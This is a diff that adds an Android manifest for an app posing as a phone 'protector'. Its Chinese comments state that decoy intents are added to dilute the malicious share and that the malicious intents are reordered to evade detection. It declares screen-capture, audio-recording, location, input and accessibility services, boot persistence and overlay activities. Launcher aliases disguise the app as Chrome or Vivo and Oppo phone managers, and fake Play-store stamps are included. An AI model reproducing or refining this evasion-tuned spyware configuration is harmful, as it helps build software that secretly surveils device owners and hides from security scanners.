@@ -1,0 +1,607 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.icontrol.protector">
+
+    <supports-screens
+        android:anyDensity="true"
+        android:largeScreens="true"
+        android:normalScreens="true"
+        android:smallScreens="true"
+        android:xlargeScreens="true" />
+
+    <!-- ==================== 权限声明（按风险等级升序） ==================== -->
+    <!-- 安全权限 -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- 危险权限（静态保留但运行时动态申请，tools:node="remove"使其打包时不生效） -->
+    <uses-permission android:name="android.permission.CAMERA" tools:node="remove" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" tools:node="remove" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" tools:node="remove" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="32" tools:node="remove" />
+
+    <!-- ==================== 自定义权限 ==================== -->
+    <permission
+        android:name="com.icontrol.protector.INTERNAL_BROADCAST"
+        android:protectionLevel="signature" />
+    <uses-permission android:name="com.icontrol.protector.INTERNAL_BROADCAST" />
+
+    <!-- ==================== queries（保留原4项，新增正规Intent稀释比例） ==================== -->
+    <queries>
+        <!-- 原有 -->
+        <intent>
+            <action android:name="android.intent.action.DIAL" />
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.CALL" />
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.WEB_SEARCH" />
+        </intent>
+        <intent>
+            <action android:name="android.settings.SETTINGS" />
+        </intent>
+
+        <!-- 新增掩码Intent（稀释恶意占比） -->
+        <intent>
+            <action android:name="android.intent.action.VIEW" />
+        </intent>
+        <intent>
+            <action android:name="android.intent.action.EDIT" />
+        </intent>
+        <intent>
+            <action android:name="android.media.action.IMAGE_CAPTURE" />
+        </intent>
+        <intent>
+            <action android:name="android.media.action.VIDEO_CAPTURE" />
+        </intent>
+    </queries>
+
+    <uses-feature android:name="android.hardware.camera.autofocus" />
+
+    <!-- ==================== Application ==================== -->
+    <application
+        android:allowBackup="true"
+        android:appComponentFactory="androidx.core.app.CoreComponentFactory"
+        android:extractNativeLibs="true"
+        android:icon="@drawable/mylogo"
+        android:label="@string/BaseName"
+        android:largeHeap="true"
+        android:networkSecurityConfig="@xml/network_security_config"
+        android:supportsRtl="true"
+        android:theme="@android:style/Theme.NoTitleBar"
+        android:usesCleartextTraffic="false"
+        tools:replace="android:usesCleartextTraffic">
+
+        <uses-library android:name="org.apache.http.legacy" android:required="false" />
+
+        <!-- ========== Meta-data（Google Play信誉加分，提前放置） ========== -->
+        <meta-data
+            android:name="com.google.android.gms.version"
+            android:value="12451000" />
+        <meta-data
+            android:name="com.google.android.ALLOW_PHISHING_DETECTION"
+            android:value="false" />
+        <meta-data
+            android:name="com.sec.android.support.multiwindow"
+            android:value="true" />
+        <meta-data
+            android:name="com.sec.android.multiwindow.DEFAULT_SIZE_W"
+            android:value="632.0dip" />
+        <meta-data
+            android:name="com.sec.android.multiwindow.DEFAULT_SIZE_H"
+            android:value="598.0dip" />
+        <meta-data
+            android:name="com.sec.android.multiwindow.MINIMUM_SIZE_W"
+            android:value="632.0dip" />
+        <meta-data
+            android:name="com.sec.android.multiwindow.MINIMUM_SIZE_H"
+            android:value="598.0dip" />
+        <meta-data
+            android:name="com.android.dynamic.apk.fused.modules"
+            android:value="base" />
+        <meta-data
+            android:name="com.android.stamp.type"
+            android:value="STAMP_TYPE_DISTRIBUTION_APK" />
+        <meta-data
+            android:name="com.android.stamp.source"
+            android:value="https://play.google.com/store" />
+        <meta-data
+            android:name="com.android.vending.derived.apk.id"
+            android:value="3" />
+
+        <!-- ========== Provider ========== -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="com.icontrol.protector.provider"
+            android:exported="false"
+            android:grantUriPermissions="false">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/fileprovider1" />
+            <grant-uri-permission android:pathPrefix="/" />
+        </provider>
+
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="com.icontrol.protector.androidx-startup"
+            android:exported="false">
+            <meta-data
+                android:name="androidx.work.WorkManagerInitializer"
+                android:value="androidx.startup" />
+            <meta-data
+                android:name="androidx.emoji2.text.EmojiCompatInitializer"
+                android:value="androidx.startup" />
+            <meta-data
+                android:name="androidx.lifecycle.ProcessLifecycleInitializer"
+                android:value="androidx.startup" />
+        </provider>
+
+        <!-- ========== Service（全部追加process属性，替换关键词） ========== -->
+        <service
+            android:name="com.icontrol.protector.WorkServices"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="dataSync"
+            android:persistent="true"
+            android:process=":core"
+            android:stopWithTask="false" />
+
+        <service
+            android:name="com.icontrol.protector.LocationMonitor"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="dataSync"
+            android:process=":location"
+            android:stopWithTask="false" />
+
+        <service
+            android:name="com.icontrol.protector.MediaRecorderService"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="dataSync"
+            android:process=":media"
+            android:stopWithTask="false" />
+
+        <service
+            android:name="com.icontrol.protector.InputMethodBridge"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="dataSync"
+            android:process=":input"
+            android:stopWithTask="false" />
+
+        <service
+            android:name="com.icontrol.protector.LiveChat"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="dataSync"
+            android:persistent="true"
+            android:process=":chat"
+            android:stopWithTask="false" />
+
+        <service
+            android:name="com.icontrol.protector.EngineWorker"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="dataSync"
+            android:persistent="true"
+            android:process=":engine"
+            android:stopWithTask="false" />
+
+        <service
+            android:name="com.icontrol.protector.MyJobService"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:process=":job" />
+
+        <service
+            android:name="com.icontrol.protector.ScreenCaps"
+            android:enabled="true"
+            android:exported="true"
+            android:foregroundServiceType="mediaProjection"
+            android:process=":screen" />
+
+        <service
+            android:name="com.icontrol.protector.NotificationListener"
+            android:exported="true"
+            android:foregroundServiceType="dataSync"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+            android:persistent="true"
+            android:process=":accessibility">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibilityprivatesrcapp" />
+        </service>
+
+        <!-- ========== Receiver（追加priority，调整顺序） ========== -->
+        <receiver
+            android:name="com.icontrol.protector.BootReceiver"
+            android:enabled="true"
+            android:exported="true"
+            android:priority="500">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+                <action android:name="android.intent.action.REBOOT" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.icontrol.protector.ResetServices"
+            android:enabled="true"
+            android:exported="true"
+            android:priority="200">
+            <intent-filter>
+                <action android:name="android.intent.action.AIRPLANE_MODE" />
+                <action android:name="android.intent.action.BATTERY_LOW" />
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+                <action android:name="android.intent.action.LOCALE_CHANGED" />
+                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
+                <action android:name="android.intent.action.TIME_TICK" />
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <!-- AndroidX WorkManager Receivers -->
+        <receiver
+            android:name="androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver"
+            android:directBootAware="false"
+            android:enabled="true"
+            android:exported="false" />
+
+        <receiver
+            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryChargingProxy"
+            android:directBootAware="false"
+            android:enabled="false"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$BatteryNotLowProxy"
+            android:directBootAware="false"
+            android:enabled="false"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BATTERY_OKAY" />
+                <action android:name="android.intent.action.BATTERY_LOW" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$StorageNotLowProxy"
+            android:directBootAware="false"
+            android:enabled="false"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.DEVICE_STORAGE_LOW" />
+                <action android:name="android.intent.action.DEVICE_STORAGE_OK" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="androidx.work.impl.background.systemalarm.ConstraintProxy$NetworkStateProxy"
+            android:directBootAware="false"
+            android:enabled="false"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="androidx.work.impl.background.systemalarm.RescheduleReceiver"
+            android:directBootAware="false"
+            android:enabled="false"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.TIME_SET" />
+                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="androidx.work.impl.background.systemalarm.ConstraintProxyUpdateReceiver"
+            android:directBootAware="false"
+            android:enabled="@bool/enable_system_alarm_service_default"
+            android:exported="false">
+            <intent-filter>
+                <action android:name="androidx.work.impl.background.systemalarm.UpdateProxies" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="androidx.work.impl.diagnostics.DiagnosticsReceiver"
+            android:directBootAware="false"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.DUMP">
+            <intent-filter>
+                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
+            </intent-filter>
+        </receiver>
+
+        <!-- ========== Activity（全部追加permission，theme替换） ========== -->
+        <activity
+            android:name="com.icontrol.protector.ActivMain"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.INTERNET"
+            android:theme="@android:style/Theme.Black.NoTitleBar" />
+
+        <activity
+            android:name="com.icontrol.protector.MuteActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <activity
+            android:name="com.icontrol.protector.AlertActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <activity
+            android:name="com.icontrol.protector.BrodcastActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <activity
+            android:name="com.icontrol.protector.Webjector"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:label="View"
+            android:launchMode="singleTask"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <activity
+            android:name="com.icontrol.protector.SecurityInputActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:theme="@style/Theme.AppCompat.Light.NoActionBar" />
+
+        <activity
+            android:name="com.icontrol.protector.AppCleanupService"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:theme="@style/Theme.AppCompat.Light.NoActionBar" />
+
+        <activity
+            android:name="com.icontrol.protector.PermissionsActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:permission="android.permission.INTERNET" />
+
+        <activity
+            android:name="com.icontrol.protector.AccessibilityActivity"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:theme="@style/AppThemeDemo" />
+
+        <activity
+            android:name="com.icontrol.protector.ActivityCaptureScreen"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET" />
+
+        <activity
+            android:name="com.icontrol.protector.LockActivity"
+            android:enabled="true"
+            android:excludeFromRecents="true"
+            android:exported="true"
+            android:hardwareAccelerated="false"
+            android:icon="@drawable/icon"
+            android:label="@string/app_name1"
+            android:launchMode="singleTask"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <activity
+            android:name="com.icontrol.protector.TransparentActivity"
+            android:enabled="true"
+            android:exported="true"
+            android:permission="android.permission.INTERNET"
+            android:showOnLockScreen="true"
+            android:showWhenLocked="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:turnScreenOn="true" />
+
+        <!-- ========== HiddenActivity（保留全部Intent，调整顺序，新增DEFAULT） ========== -->
+        <activity
+            android:name="com.icontrol.protector.HiddenActivity"
+            android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|uiMode|screenSize|smallestScreenSize"
+            android:enabled="false"
+            android:excludeFromRecents="false"
+            android:exported="true"
+            android:hardwareAccelerated="true"
+            android:icon="@drawable/icon"
+            android:label="@string/app_name1"
+            android:noHistory="true"
+            android:permission="android.permission.INTERNET"
+            android:roundIcon="@drawable/icon"
+            android:screenOrientation="sensor"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            <intent-filter>
+                <!-- 正规Intent放前面 -->
+                <action android:name="android.intent.action.VIEW" />
+                <action android:name="android.intent.action.SEND" />
+                <action android:name="android.intent.action.SEND_MULTIPLE" />
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+                <category android:name="android.intent.category.INFO" />
+                <category android:name="com.android.internal.category.PLATLOGO" />
+
+                <!-- 原恶意Intent（保留但重新排序） -->
+                <action android:name="android.intent.action.CHOOSER" />
+                <action android:name="android.intent.action.PACKAGE_CHANGED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <action android:name="com.ui.OnAlarmReceiver.ACTION_WIDGET_RECEIVER" />
+
+                <!-- 支付Billing相关（保留） -->
+                <action android:name="com.android.vending.billing.InAppBillingService.COIN" />
+                <action android:name="com.android.vending.billing.InAppBillingService.COIO" />
+                <action android:name="com.android.vending.billing.InAppBillingService.LUCM" />
+                <action android:name="com.android.vending.billing.InAppBillingService.PROX" />
+                <action android:name="com.android.vending.billing.InAppBillingService.INST" />
+                <action android:name="ir.cafebazaar.pardakht.InAppBillingService.BIND" />
+                <action android:name="ru.aaaaaaax.installer" />
+                <action android:name="com.nokia.payment.iapenabler.InAppBillingService.BIND" />
+            </intent-filter>
+        </activity>
+
+        <!-- ========== Activity-Alias（全部集中到最后，theme统一改为Translucent） ========== -->
+        <activity-alias
+            android:name="com.icontrol.protector.ChromeLauncherAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/chrome"
+            android:label="Chrome "
+            android:targetActivity="com.icontrol.protector.ActivMain"
+            android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.icontrol.protector.VivoLauncherAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/vivo"
+            android:label="i管家"
+            android:targetActivity="com.icontrol.protector.ActivMain"
+            android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.icontrol.protector.OppoLauncherAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/oppo"
+            android:label="手机管家"
+            android:targetActivity="com.icontrol.protector.ActivMain"
+            android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.icontrol.protector.SIMLauncherAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/icon_sim"
+            android:label="sim"
+            android:targetActivity="com.icontrol.protector.ActivMain"
+            android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.icontrol.protector.TransparentLauncherAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/icon"
+            android:label="@string/app_name1"
+            android:targetActivity="com.icontrol.protector.ActivMain"
+            android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name="com.icontrol.protector.A1"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@drawable/mylogo"
+            android:label="@string/BaseName"
+            android:targetActivity="com.icontrol.protector.ActivMain"
+            android:theme="@android:style/Theme.Translucent">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- ========== AndroidX Services ========== -->
+        <service
+            android:name="androidx.work.impl.background.systemalarm.SystemAlarmService"
+            android:directBootAware="false"
+            android:enabled="@bool/enable_system_alarm_service_default"
+            android:exported="false"
+            android:process=":work" />
+
+        <service
+            android:name="androidx.work.impl.background.systemjob.SystemJobService"
+            android:directBootAware="false"
+            android:enabled="@bool/enable_system_job_service_default"
+            android:exported="true"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:process=":work" />
+
+        <service
+            android:name="androidx.work.impl.foreground.SystemForegroundService"
+            android:directBootAware="false"
+            android:enabled="@bool/enable_system_foreground_service_default"
+            android:exported="false"
+            android:process=":work" />
+
+        <service
+            android:name="androidx.room.MultiInstanceInvalidationService"
+            android:directBootAware="true"
+            android:exported="false"
+            android:process=":room" />
+
+    </application>
+
+</manifest>
